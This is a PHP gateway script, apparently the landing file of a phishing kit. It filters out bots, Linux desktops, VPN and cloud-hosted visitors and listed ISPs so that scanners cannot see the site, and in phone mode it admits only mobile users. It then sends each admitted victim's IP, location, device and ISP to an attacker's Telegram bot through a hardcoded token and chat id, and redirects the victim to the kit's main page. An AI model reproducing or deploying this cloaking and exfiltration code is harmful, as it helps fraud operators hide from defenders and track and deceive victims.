<?php
session_start();

// Include security measures
include './prevents/anti.php';
include './prevents/anti2.php';
include_once "app/config/panel.php";

function update_ini($data, $file) {
    $content = "";
    foreach ($data as $section => $values) {
        if ($section === "") continue;
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) return false;
    fwrite($handle, $content);
    fclose($handle);
}

// Enhanced user agent detection
function detect_device_type() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Detect OS
    if (stripos($user_agent, 'Windows') !== false) return 'Windows';
    if (stripos($user_agent, 'Mac') !== false || stripos($user_agent, 'iOS') !== false) return 'Mac/iOS';
    if (stripos($user_agent, 'Android') !== false) return 'Android';
    if (stripos($user_agent, 'Linux') !== false) return 'Linux';
    
    return 'Unknown';
}

function detect_browser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if (stripos($user_agent, 'Chrome') !== false) return 'Chrome';
    if (stripos($user_agent, 'Firefox') !== false) return 'Firefox';
    if (stripos($user_agent, 'Safari') !== false) return 'Safari';
    if (stripos($user_agent, 'Edge') !== false) return 'Edge';
    
    return 'Unknown';
}

// Enhanced bot detection
function is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    
    // Block Linux users (common for bots)
    if (stripos($user_agent, 'linux') !== false && stripos($user_agent, 'android') === false) {
        return true;
    }
    
    // Common bot user agents
    $bot_indicators = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
        'phantomjs', 'selenium', 'headless', 'httpclient', 'requests'
    ];
    
    foreach ($bot_indicators as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

// Enhanced VPN/Proxy detection
function is_vpn_proxy($ip) {
    $vpn_proxy_indicators = [
        'vpn', 'proxy', 'tor', 'anonymous', 'hide', 'shield', 'private',
        'hosting', 'server', 'data center', 'cloud', 'digitalocean', 'linode',
        'vultr', 'aws', 'google cloud', 'azure', 'ovh', 'hetzner'
    ];
    
    $ip_info = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    
    if ($ip_info && $ip_info['status'] === 'success') {
        $org = strtolower($ip_info['as'] ?? '');
        $isp = strtolower($ip_info['isp'] ?? '');
        
        foreach ($vpn_proxy_indicators as $indicator) {
            if (strpos($org, $indicator) !== false || strpos($isp, $indicator) !== false) {
                return true;
            }
        }
    }
    
    return false;
}

function countryCodeToFlagEmoji($countryCode) {
    $flagOffset = 0x1F1E6;
    $asciiOffset = 0x41;
    $firstChar = ord($countryCode[0]) - $asciiOffset + $flagOffset;
    $secondChar = ord($countryCode[1]) - $asciiOffset + $flagOffset;
    return mb_chr($firstChar, 'UTF-8') . mb_chr($secondChar, 'UTF-8');
}

if (PHONE) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $mobile_keywords = ["Mobile", "Android", "iPhone", "Windows Phone", "Opera Mini", "IEMobile", "BlackBerry"];
    $is_mobile = false;
    foreach ($mobile_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            $is_mobile = true;
            break;
        }
    }
    if (!$is_mobile) {
        $file = './app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("Access denied. Mobile devices only.");
    }
}

function get_client_ip() {
    $ip = null;
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
        if (array_key_exists($header, $_SERVER)) {
            foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                $potential_ip = trim($potential_ip);
                if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    $ip = $potential_ip;
                    break 2;
                }
            }
        }
    }
    return $ip ?: '127.0.0.1';
}

$visitorip = TESTMODE ? "196.127.214.107" : get_client_ip();
$ipinfo_json = @json_decode(file_get_contents("http://ip-api.com/json/".$visitorip), true);

// Update stats
$file = 'app/Panel/stats/stats.ini';
$data = @parse_ini_file($file);
$data['clicks']++;
update_ini($data, $file);

// Block Linux users and bots
if (is_bot()) {
    $data['bots']++;
    update_ini($data, $file);
    die("Access denied. Automated traffic detected.");
}

// Block VPN/Proxy
if (is_vpn_proxy($visitorip)) {
    $data['bots']++;
    update_ini($data, $file);
    die("Access denied. VPN/Proxy detected. Please disable to continue.");
}

$blocked_isps = include('prevents/block.php');
$org = $ipinfo_json['as'] ?? 'Unknown';
foreach ($blocked_isps as $blocked_isp) {
    if (stripos(strtolower($org), strtolower($blocked_isp)) !== false) {
        $data['bots']++;
        update_ini($data, $file);
        die("Access denied: " . $visitorip);
    }
}

// Set session and redirect directly to main page
$_SESSION['FIL212sD'] = true;
$_SESSION['captcha_passed'] = true;

// Send detailed notification to Telegram
$device_type = detect_device_type();
$browser = detect_browser();
$ip_data = @json_decode(file_get_contents("http://ip-api.com/json/{$visitorip}?fields=country,countryCode,city,isp,org"), true);

$country = $ip_data['country'] ?? 'Unknown';
$countryCode = $ip_data['countryCode'] ?? '';
$city = $ip_data['city'] ?? 'Unknown';
$isp = $ip_data['isp'] ?? 'Unknown';
$flagEmoji = $countryCode ? countryCodeToFlagEmoji($countryCode) : '🏴';

$message = "🔐 NEW ACCESS\n";
$message .= "📍 IP: {$visitorip}\n";
$message .= "🎯 Location: {$country} {$flagEmoji} | {$city}\n";
$message .= "🖥️ Device: {$device_type}\n";
$message .= "🌐 Browser: {$browser}\n";
$message .= "📡 ISP: {$isp}\n";
$message .= "🕒 Time: " . date('Y-m-d H:i:s') . "\n";
$message .= "✅ Status: DIRECT ACCESS";

$apiToken = "8247381303:AAGbP2BlR1ME9873WxtAjLRp1sC3h82mgto";
$telegram_data = [
    'chat_id' => '-100194154232',
    'text' => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$apiToken/sendMessage");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegram_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect directly to main page
header("Location: app/index.php?view=main&id=".md5(time()));
exit();